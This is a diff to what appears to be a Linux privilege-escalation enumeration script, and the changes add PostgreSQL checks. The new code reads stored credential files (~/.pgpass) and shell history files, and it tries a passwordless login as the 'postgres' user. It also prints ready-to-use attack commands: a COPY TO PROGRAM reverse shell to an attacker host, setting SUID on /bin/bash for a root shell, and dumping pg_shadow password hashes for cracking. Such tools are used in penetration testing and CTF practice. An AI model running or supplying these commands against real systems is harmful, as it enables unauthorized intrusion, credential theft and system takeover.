@@ -740,10 +740,10 @@ echo ""
 #  10. MYSQL / DATABASE INFO
 # ============================================================================
 echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
-echo -e "${MAG}  PHASE 10: DATABASE / MYSQL${RST}"
+echo -e "${MAG}  PHASE 10: DATABASE / MYSQL / POSTGRESQL${RST}"
 echo -e "${MAG}═══════════════════════════════════════════════════════════════════════${RST}"
 
-section_header "MySQL / Database Info" "$sql"
+section_header "MySQL / PostgreSQL Database Info" "$sql"
 
 sub_header "MySQL Config Files" "$sql"
 for cf in /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf; do
@@ -776,9 +776,56 @@ run_cmd "~/.mysql_history" "cat ~/.mysql_history" "$sql"
 sub_header "Database Files on Disk" "$sql"
 run_cmd "find .db/.sql files" "find / -name '*.db' -o -name '*.sql' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -20" "$sql"
 
-sub_header "PostgreSQL" "$sql"
-run_cmd "pg_hba.conf" "find / -name 'pg_hba.conf' 2>/dev/null" "$sql"
-run_cmd "pgpass" "cat ~/.pgpass" "$sql"
+sub_header "PostgreSQL Config" "$sql"
+pg_hba_path=$(find / -name 'pg_hba.conf' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -5)
+run_cmd "pg_hba.conf locations" "echo '$pg_hba_path'" "$sql"
+for hba in $pg_hba_path; do
+    if [ -r "$hba" ]; then
+        run_cmd "$hba" "cat $hba" "$sql"
+        # trust auth = no password required
+        if grep -qE '^\s*(local|host)\s+\S+\s+\S+.*\btrust\b' "$hba" 2>/dev/null; then
+            finding "pg_hba.conf has 'trust' auth entries — passwordless PostgreSQL access!" "$sql"
+        fi
+    fi
+done
+run_cmd "~/.pgpass" "cat ~/.pgpass 2>/dev/null" "$sql"
+if [ -r ~/.pgpass ]; then
+    finding "~/.pgpass is readable — contains stored PostgreSQL credentials!" "$sql"
+fi
+run_cmd "postgresql.conf" "find / -name 'postgresql.conf' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -3 | xargs cat 2>/dev/null" "$sql"
+
+sub_header "PostgreSQL Unauthenticated Access" "$sql"
+pg_result=$(psql -U postgres -c '\l' 2>/dev/null)
+if [ -n "$pg_result" ]; then
+    finding "Connected to PostgreSQL as 'postgres' without a password!" "$sql"
+    echo "$pg_result" >> "$sql"
+    echo "" >> "$sql"
+    sub_header "PostgreSQL Auto-Enumeration" "$sql"
+    run_cmd "List databases" "psql -U postgres -c '\l'" "$sql"
+    run_cmd "List users/roles" "psql -U postgres -c '\du'" "$sql"
+    run_cmd "Superuser check" "psql -U postgres -c 'SELECT usename,usesuper,usecreatedb FROM pg_user;'" "$sql"
+    run_cmd "Version" "psql -U postgres -c 'SELECT version();'" "$sql"
+    # Check for COPY TO PROGRAM (RCE as postgres user)
+    copy_program=$(psql -U postgres -c "SELECT pg_catalog.has_function_privilege('pg_catalog.pg_ls_dir(text)', 'execute');" 2>/dev/null)
+    run_cmd "COPY TO PROGRAM available" "psql -U postgres -c \"SELECT current_setting('is_superuser');\"" "$sql"
+    pg_superuser=$(psql -U postgres -t -c "SELECT current_setting('is_superuser');" 2>/dev/null | tr -d ' ')
+    if [ "$pg_superuser" = "on" ]; then
+        finding "PostgreSQL 'postgres' user is a superuser — COPY TO PROGRAM gives OS command execution!" "$sql"
+    fi
+    # Check for plpgsql / untrusted languages
+    run_cmd "Installed languages" "psql -U postgres -c 'SELECT lanname,lanpltrusted FROM pg_language;'" "$sql"
+    untrusted_lang=$(psql -U postgres -t -c "SELECT lanname FROM pg_language WHERE lanpltrusted='f' AND lanname != 'internal' AND lanname != 'c';" 2>/dev/null | tr -d ' \n')
+    if [ -n "$untrusted_lang" ]; then
+        finding "Untrusted procedural language installed: $untrusted_lang — potential code execution inside DB!" "$sql"
+    fi
+else
+    echo "  PostgreSQL postgres login without password: FAILED (good)." >> "$sql"
+    echo -e "    ${YLW}[—] PostgreSQL no-password login failed${RST}"
+    echo "" >> "$sql"
+fi
+
+sub_header "PostgreSQL History" "$sql"
+run_cmd "~/.psql_history" "cat ~/.psql_history 2>/dev/null" "$sql"
 
 separator "$sql"
 echo -e "${GRN}    [✓] Saved → ${WHT}$sql${RST}"
@@ -1237,6 +1284,29 @@ if [ -n "$dangerous_caps" ]; then
   \$ tcpdump -i any -A 'port 80 or port 21 or port 23 or port 110'" ;;
         esac
     done <<< "$dangerous_caps"
+fi
+
+# ── P1: PostgreSQL superuser — COPY TO PROGRAM (RCE) ─────────────────────
+if [ -n "$pg_result" ] && [ "$pg_superuser" = "on" ]; then
+    exploit_entry "P1" "PostgreSQL superuser access — COPY TO PROGRAM RCE" \
+"  Execute OS commands as the postgres user:
+  \$ psql -U postgres -c \"COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1';\"
+  Or add SUID to bash:
+  \$ psql -U postgres -c \"COPY (SELECT '') TO PROGRAM 'chmod +s /bin/bash';\"
+  \$ /bin/bash -p
+  Dump hashes for offline cracking:
+  \$ psql -U postgres -c 'SELECT usename,passwd FROM pg_shadow;'"
+fi
+
+# ── P2: PostgreSQL no-auth access (non-superuser) ─────────────────────────
+if [ -n "$pg_result" ] && [ "$pg_superuser" != "on" ]; then
+    exploit_entry "P2" "PostgreSQL access as 'postgres' (non-superuser)" \
+"  Enumerate data and escalate:
+  \$ psql -U postgres -c '\l'           # list databases
+  \$ psql -U postgres -c '\du'          # list roles
+  \$ psql -U postgres -d <db> -c '\dt'  # list tables
+  Check for SECURITY DEFINER functions that may allow privesc:
+  \$ psql -U postgres -c \"SELECT proname,prosecdef FROM pg_proc WHERE prosecdef='t';\""
 fi
 
 # ── P2: NFS no_root_squash ────────────────────────────────────────────────
